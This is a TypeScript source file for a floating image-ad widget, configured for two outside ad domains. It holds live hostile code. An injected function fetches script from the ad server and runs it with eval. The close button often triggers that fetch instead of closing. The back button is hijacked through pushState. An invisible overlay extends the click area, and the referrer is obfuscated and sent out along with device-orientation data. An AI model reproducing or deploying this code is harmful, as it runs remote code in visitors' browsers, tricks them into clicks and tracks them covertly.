/*!
 * @params {String} width 宽度 默认200px
 * @params {String} height 高度 默认300px
 * @params {Number} shadow 不被看见的区域百分比，默认0不开启，指的是在原来的大小基础上向四周延伸的大小
 * @params {String} pos 默认 'left', 值有：'left','right','top','bottom','center', 'none'表示不设置定位
 * @params {String} distanceTop pos值为'left','right'时设置
 * @params {Number || String} close_btn 关闭按钮 默认1，1默认按钮效果，或者图片地址
 * @params {Number} closeDec 关闭按钮是否真的关闭 范围0.01 ~ 1 默认0，0可直接关闭
 * @params {Number} showBorder 是否显示边框，默认0， 0 不显示，其它数字表示边框大小
 * @params {0 || String} effect 效果，0为关闭 ，默认'pulse'  'tada'抖动 'pulse'放大 'rotate'旋转
 * @params {String} effectdura 效果间隔, 默认 '5s';
 * @params {String} effectdelay 效果延时, 默认 '3s';
 * @params {String} stutslink 统计链接地址
 * @params {String} adlink 链接地址
 * @params {Number} btnNumpar 按钮传参数字 默认5
 * @params {Number} imgNumpar 图片传参数字 默认1
 * @params {Number} shadowNumpar 不可见区域传参数字 默认3
 * @params {Number} backNumpar 不可见区域传参数字 默认5
 * @params {Number} imgduration 图片切换间隔 默认2000 
 * @params {Array} imgs 图片地址数组
 * 注意iframe 使用带上参数ifr。 e.g. <iframe src="iframe.html?ifr=1" frameborder="0" scrolling="no" width="300" height="500"></iframe> 其中wdith和height自定义，但是必填。 受浏览器安全策略限制，shadow参数无效
*/
/* 
 * notice: 固定位置引入必须给引入的script标签加上id="zrgscript" 目前固定位置同一个js引入2个可能会在某些浏览器存在冲突情况，因为id相同
 */
class Zad {
    [x: string]: any;
    constructor({
            width,
            height,
            shadow,
            pos,
            distanceTop,
            close_btn,
            closeDec,
            showBorder,
            effect,
            effectdura,
            effectdelay,
            stutslink,
            adlink,
            btnNumpar,
            imgNumpar,
            shadowNumpar,
            backNumpar,
            imgduration,
            imgs
        }){
        this.adWidth = width || '200px';
        this.adHeight = height || '300px';
        this.shadow = shadow || 0;
        this.pos = pos || 'left';
        this.distanceTop = distanceTop || '100px';
        this.close_btn = close_btn || 1;
        this.closeDec = closeDec || 0;
        this.showBorder = showBorder || 0;
        this.effect = effect || 'pulse';
        this.effectdura = effectdura || '5s';
        this.effectdelay = effectdelay;
        this.stutslink = stutslink || '';
        this.adlink = adlink || '';
        this.btnNumpar = btnNumpar || 5;
        this.imgNumpar = imgNumpar || 1;
        this.shadowNumpar = shadowNumpar || 3;
        this.backNumpar = backNumpar || 5;
        this.imgduration = imgduration || 2000;
        this.imgs = imgs || [];

        this.winW = document.documentElement.clientWidth || document.body.clientWidth;
        this.winH = document.documentElement.clientHeight || document.body.clientHeight;
        this.init();
    }
    init(){
        this.writeCss();
        this.creatWrapper();
        this.mobc();
        if (this.getQueryParam()) {
            // let bodyEle = document.documentElement.getElementsByTagName('body');
            this.iframeInnercss();
        }
    }
    getQueryParam(){
        let urlParam = 'ifr';
        let query = window.location.search.substring(1);
        let vars = query.split("&");
        for (let i=0;i<vars.length;i++) {
            let pair = vars[i].split("=");
            if(pair[0] == urlParam){return pair[1];}
        }
        return(false);
    }
    creatWrapper() {
        let wrap = document.createElement('div');
        let closeBtn = this.closeBtn();
        let imgbox = this.imgBox();
        wrap.className = 'zad-wrap';
        wrap.id = 'zadbox';
        let wrapWidth = `${this.adWidth}`,
        wrapHeight = `${this.adHeight}`;
        if (this.getQueryParam()) {
            wrapWidth = '100%';
            wrapHeight = '100%';
        }
        wrap.style.cssText = `width: ${wrapWidth};height: ${wrapHeight};`;
        wrap.style.cssText += this.adPosition(this.pos);

        // let alink = this.adlink;
        let paranum = this.btnNumpar;
        function propt(probability:number){
            var probability = probability*100 || 1;
            var odds = Math.floor(Math.random()*100);
            if(probability === 1){
                closeBtn.setAttribute('onclick', `cxta(${paranum})`);
                // location.href = alink;
            };
            if(odds < probability){
                closeBtn.setAttribute('onclick', `cxta(${paranum})`);
                // location.href = alink;
            }else{
                closeBtn.onclick = () => {
                    wrap.style.display = 'none';
                    document.body.removeChild(wrap);
                }
            }
        };
        propt(Number(this.closeDec));
        // closeBtn.onclick = () => {
        //     propt(Number(this.closeDec));
        // }
        
        wrap.appendChild(closeBtn);
        wrap.appendChild(imgbox);
        window.addEventListener('load', ()=>{
            this.zstatus();
            this.winW = document.documentElement.clientWidth || document.body.clientWidth;
            this.winH = document.documentElement.clientHeight || document.body.clientHeight;
            if (this.pos == 'none' && window.self == window.top) {
                let zscript = document.getElementById('zrgscript');
                if (zscript) {
                    let parentEle = zscript.parentNode as HTMLElement;
                    if (parentEle.tagName == 'HEAD') {
                        let first = document.body.firstElementChild;
                        document.body.insertBefore(wrap,first);
                    }else{
                        zscript.insertAdjacentElement('afterend',wrap);
                    }
                }
            }else{
                document.body.appendChild(wrap);
            }
        })
    }
    adPosition(pos:string){
        let posCss = '';
        let ahnum = (this.adHeight).replace(/px/,'');
        let awnum= (this.adWidth).replace(/px/,'');
        if (this.adHeight.indexOf('%') > -1) {
            ahnum = (this.adHeight).replace(/%/,'');
            ahnum = this.winH * (Number(ahnum) / 100);
        }
        if (this.adWidth.indexOf('%') > -1) {
            awnum = (this.adWidth).replace(/%/,'');
            awnum = this.winW * (Number(awnum) / 100);
        }

        let margin_top = (Number(ahnum)/2).toFixed();
        let margin_left = (Number(awnum)/2).toFixed();
        switch (pos) {
            case 'left':
            posCss = `position: fixed;z-index: 99999;left: 0;top: ${ this.distanceTop };`;
                break;
            case 'right':
            posCss = `position: fixed;z-index: 99999;right: 0;top: ${ this.distanceTop };`;
                break;
            case 'top':
            posCss = `position: fixed;z-index: 99999;top: 0;left: 0;right: 0;width: 100%`;
                break;
            case 'bottom':
            posCss = `position: fixed;z-index: 99999;bottom: 0;left: 0;right: 0;width: 100%`;
                break;
            case 'center':
            posCss = `position: fixed;z-index: 99999;top: 50%;margin-top: -${ margin_top }px;left: 50%;margin-left: -${margin_left}px;`;
                break;
            case 'none':
            posCss = `position: relative;`;
                break;
            default:
            posCss = pos;
                break;
        }
        if (this.getQueryParam()) {
            posCss = '';
        }
        return posCss;
    }
    closeBtn(){
        let btn = document.createElement('div');
        btn.className = 'zad-btn-close';
        if (this.close_btn == 1) {
            btn.className += ' default';
        }else{
            btn.style.backgroundImage = `url(${this.close_btn})`;
        }
        // if (this.close_btn) {
        //     btn.style.display = 'block';
        // }else {
        //     btn.style.display = 'none';
        // }
        return btn;
    }
    imgBox(){
        let imglist = this.imgs;
        let imgEle = '';
        let ahnum = (this.adHeight).replace(/px/,'');
        let awnum= (this.adWidth).replace(/px/,'');
        if (this.adHeight.indexOf('%') > -1) {
            ahnum = (this.adHeight).replace(/%/,'');
            ahnum = this.winH * (Number(ahnum) / 100);
        }
        if (this.adWidth.indexOf('%') > -1) {
            awnum = (this.adWidth).replace(/%/,'');
            awnum = this.winW * (Number(awnum) / 100);
        }
        
        let aw = Number(awnum);
        let ah = Number(ahnum);
        let anthoer_w = aw* (this.shadow)/100;
        let anthoer_h = ah* (this.shadow)/100;
        let coverW = aw + anthoer_w;
        let coverH = ah + anthoer_h;
        let paranum = this.shadowNumpar;
        if (imglist.length > 0) {
            for (let i = 0; i < imglist.length; i++) {
                let cssDisplay = i === 0 ? 'block': 'none';
                imgEle += `<div class="item" style="display:${cssDisplay};"><a><img src="${imglist[i]}" /><div class="cover" style="width: ${coverW}px;height: ${coverH}px;top: -${anthoer_h/2}px;left: -${anthoer_w/2}px;" onclick="cxta(${paranum});"></div></a></div>`;
            }
        }
        let imgBox = document.createElement('div');
        imgBox.className = 'zad-img-box';
        imgBox.setAttribute('onclick', `cxta(${this.imgNumpar})`);
        if (this.effect !== 0) {
            imgBox.className += ' ' + `animated ${this.effect} infinite slower`;
        }
        if (this.effectdura != '') {
            imgBox.style.cssText += `animation-duration: ${this.effectdura};-webkit-animation-duration: ${this.effectdura};`;
        }
        if (this.effectdelay != '') {
            imgBox.style.cssText += `animation-delay: ${this.effectdelay};-webkit-animation-delay: ${this.effectdelay};`;
        }
        imgBox.innerHTML = imgEle;
        // let childNode = imgBox.childNodes;
        let childNode = imgBox.querySelectorAll('.item') as NodeListOf<HTMLElement>;
        let index = 1;
        setInterval(()=>{
            if (index > childNode.length -1) {
                index = 0;
            }
            for (let j = 0; j < childNode.length; j++) {
                childNode[j].style.display = 'none';
                childNode[j].onclick = e=>{
                    if ( e && e.stopPropagation ) {
                        e.stopPropagation();
                    }else {
                        window.event.cancelBubble = true;
                    }
                }
            }
            childNode[index].style.display = 'block';
            index++;
        }, this.imgduration);
        let borderDiv = document.createElement('div');
        borderDiv.className = 'boddiv';
        if (this.showBorder == 1) {
            borderDiv.style.border= `${this.showBorder}px solid red`;
        }
        imgBox.appendChild(borderDiv);
        return imgBox;
    }
    ref(){
        var u;
        try {
            u = window.top.document.referrer;
        } catch (err) {
            u = document.referrer;
        }
        var r = '',
            c:number;
        for (var i = 0; i < u.length; i++) {
            if (i == 1000) {
                break;
            }
            c = u.charCodeAt(i);
            if (c > 96 && c < 123) {
                c += i % 8;
                if (c > 122) c -= 26;
            }
            r += String.fromCharCode(c);
        }
        return r;
    }
    zstatus(){
        var odiv_m_1 = document.createElement('div');
        odiv_m_1.style.display = "none";
        var oiframe_m_1 = document.createElement("iframe");
        oiframe_m_1.src = `${this.stutslink}&l=h`;
        oiframe_m_1.height="0";
        oiframe_m_1.width="0";
        oiframe_m_1.sandbox="allow-same-origin allow-scripts allow-forms";
        oiframe_m_1.style.display = "none";
        odiv_m_1.appendChild(oiframe_m_1);
        document.body.appendChild(odiv_m_1);
    }
    mobc(){
        window.addEventListener("deviceorientation", event => {
            let  M18_url = `${this.adlink}&pn=0.25&ref=${this.ref()}&refso=${navigator.platform}_dp&zhongli=_${Math.floor(event.alpha)},${Math.floor(event.beta)},${Math.floor(event.gamma)}`;

            let strjs1 = `function cxta(ct){var a=new XMLHttpRequest();var b='${M18_url}&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}}pushHistory();function pushHistory(){var state={title:'title',url:'#'};window.history.pushState(state,'title','#')}window.addEventListener('popstate', function (e) {cxta(${this.backNumpar});}, false);`;
            let js1nod = document.createElement('script');
            js1nod.innerHTML = strjs1;
            document.getElementsByTagName('head')[0].appendChild(js1nod);

        }, false);
    }
    writeCss(){
        let style = document.createElement('style');
        style.innerHTML =`
        .zad-wrap {
            
        }
        .zad-btn-close {
            display: block;
            position: absolute;
            width: 18px;
            height: 18px;
            -webkit-border-radius: 50%;
            -moz-border-radius: 50%;
            border-radius: 50%;
            right: 0;
            top: 0;
            z-index: 10;
            background-repeat: no-repeat;
            background-position: center;
            background-size: cover;
        }
        .zad-btn-close.default {background-color: #ccc;}
        .zad-btn-close.default:before {
            content: '×';
            position: absolute;
            top: 0;
            color: #fff;
            width: 100%;
            height: 100%;
            text-align: center;
            line-height: 100%;
            cursor: pointer;
        }
        .zad-img-box {
            width: 100%;
            height: 100%;
        }
        .boddiv {
            position: absolute;
            width: 100%;
            height: 100%;
            top:0;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            text-fill-color: transparent;
            -webkit-animation: hue 8s infinite linear;
            animation: hue 8s infinite linear;
        }
        .boddiv.hasborder {border: 3px solid red;}
        .zad-img-box .item {
            width: 100%;
            height: 100%;
            position: relative;
        }
        .zad-img-box .cover {
            position: absolute;
        }
        .zad-img-box img {
            width: 100%;
            height: 100%;
        }
        @keyframes hue {
            0% {
                -webkit-filter: hue-rotate(0deg);
            }
            100% {
                -webkit-filter: hue-rotate(360deg);
            }
        }
        `;
        if (this.effect !== 0) {
            style.innerHTML += `
            .animated {
                -webkit-animation-duration: 1s;
                animation-duration: 1s;
                -webkit-animation-fill-mode: both;
                animation-fill-mode: both;
              }
              .animated.infinite {
                -webkit-animation-iteration-count: infinite;
                animation-iteration-count: infinite;
              }
              .animated.delay-5s {
                -webkit-animation-delay: 5s;
                animation-delay: 5s;
              }
              
              .animated.slow {
                -webkit-animation-duration: 2s;
                animation-duration: 2s;
              }
              
              .animated.slower {
                -webkit-animation-duration: 3s;
                animation-duration: 3s;
              }
              @media (print), (prefers-reduced-motion) {
                .animated {
                  -webkit-animation: unset !important;
                  animation: unset !important;
                  -webkit-transition: none !important;
                  transition: none !important;
                }
              }
            @-webkit-keyframes tada {
                from {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              
                10%,
                20% {
                  -webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                  transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                }
              
                30%,
                50%,
                70%,
                90% {
                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                }
              
                40%,
                60%,
                80% {
                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                }
              
                to {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              }
              
              @keyframes tada {
                from {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              
                10%,
                20% {
                  -webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                  transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
                }
              
                30%,
                50%,
                70%,
                90% {
                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
                }
              
                40%,
                60%,
                80% {
                  -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                  transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
                }
              
                to {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              }
              
              .tada {
                -webkit-animation-name: tada;
                animation-name: tada;
              }
              @-webkit-keyframes pulse {
                from {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              
                50% {
                  -webkit-transform: scale3d(1.05, 1.05, 1.05);
                  transform: scale3d(1.05, 1.05, 1.05);
                }
              
                to {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              }
              
              @keyframes pulse {
                from {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              
                50% {
                  -webkit-transform: scale3d(1.05, 1.05, 1.05);
                  transform: scale3d(1.05, 1.05, 1.05);
                }
              
                to {
                  -webkit-transform: scale3d(1, 1, 1);
                  transform: scale3d(1, 1, 1);
                }
              }
              
              .pulse {
                -webkit-animation-name: pulse;
                animation-name: pulse;
            }
            
            @-webkit-keyframes animaterotate {
                0% {
                    -webkit-transform: rotate(0deg);
                    -moz-transform: rotate(0deg);
                    -ms-transform: rotate(0deg);
                    transform: rotate(0deg);
                }
                100% {
                    -webkit-transform: rotate(360deg);
                    -moz-transform: rotate(360deg);
                    -ms-transform: rotate(360deg);
                    transform: rotate(360deg);
                }
            }
            @-moz-keyframes animaterotate {
                0% {
                    -webkit-transform: rotate(0deg);
                    -moz-transform: rotate(0deg);
                    -ms-transform: rotate(0deg);
                    transform: rotate(0deg);
                }

                100% {
                    -webkit-transform: rotate(360deg);
                    -moz-transform: rotate(360deg);
                    -ms-transform: rotate(360deg);
                    transform: rotate(360deg);
                }
            }
            @keyframes animaterotate {
                0% {
                    -webkit-transform: rotate(0deg);
                    -moz-transform: rotate(0deg);
                    -ms-transform: rotate(0deg);
                    transform: rotate(0deg);
                }

                100% {
                    -webkit-transform: rotate(360deg);
                    -moz-transform: rotate(360deg);
                    -ms-transform: rotate(360deg);
                    transform: rotate(360deg);
                }
            }
            .zad-img-box.rotate {
                -webkit-animation-name: animaterotate;
                animation-name: animaterotate;
                -webkit-animation-timing-function: linear;
                animation-timing-function: linear;
                -webkit-animation-duration: 8s;
                animation-duration: 8s;
            }
            `;
        }
        let head = document.getElementsByTagName('head')[0];
        head.appendChild(style);
    }
    iframeInnercss(){
        let style = document.createElement('style');
        style.innerHTML = `
        html, body {
            width: 100%;height: 100%;
            margin: 0;padding: 0;
        }
        .zad-wrap {
            width: 100%;
            height: 100%;
        }
        `;
        let head = document.getElementsByTagName('head')[0];
        head.appendChild(style);
    }
}

new Zad({
    width: '200px',
    height: '240px',
    shadow: 40,
    pos: 'right',
    distanceTop: '100px',
    close_btn: 'data:image/png;base64,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',
    closeDec: 0.5,
    showBorder: 0,
    effect: 'tada',
    effectdura: '6s',
    effectdelay: '',
    stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
    adlink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
    btnNumpar: 5,
    imgNumpar: 1,
    shadowNumpar: 3,
    backNumpar: 5,
    imgduration: 3000,
    imgs: ['imgs/img1.jpg','imgs/img2.jpg','imgs/img3.jpg','imgs/img4.jpg','imgs/img5.jpg'],
    // imgs: ['https://cdn.pixabay.com/photo/2015/12/01/20/28/road-1072823_960_720.jpg','https://cdn.pixabay.com/photo/2015/12/01/20/28/green-1072828_960_720.jpg','https://cdn.pixabay.com/photo/2017/02/01/22/02/mountain-landscape-2031539_960_720.jpg','https://cdn.pixabay.com/photo/2019/03/01/18/52/house-4028391_960_720.jpg','https://cdn.pixabay.com/photo/2015/06/19/21/24/the-road-815297_960_720.jpg']
})

new Zad({
    width: '200px',
    height: '300px',
    shadow: 30,
    pos: 'left',
    distanceTop: '150px',
    close_btn: 1,
    closeDec: 0.5,
    showBorder: 0,
    effect: 'tada',
    effectdura: '6s',
    effectdelay: '',
    stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
    adlink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
    btnNumpar: 5,
    imgNumpar: 1,
    shadowNumpar: 3,
    backNumpar: 5,
    imgduration: 3000,
    imgs: ['imgs/img1.jpg','imgs/img2.jpg','imgs/img3.jpg','imgs/img4.jpg','imgs/img5.jpg'],
    // imgs: ['https://cdn.pixabay.com/photo/2015/12/01/20/28/road-1072823_960_720.jpg','https://cdn.pixabay.com/photo/2015/12/01/20/28/green-1072828_960_720.jpg','https://cdn.pixabay.com/photo/2017/02/01/22/02/mountain-landscape-2031539_960_720.jpg','https://cdn.pixabay.com/photo/2019/03/01/18/52/house-4028391_960_720.jpg','https://cdn.pixabay.com/photo/2015/06/19/21/24/the-road-815297_960_720.jpg']
})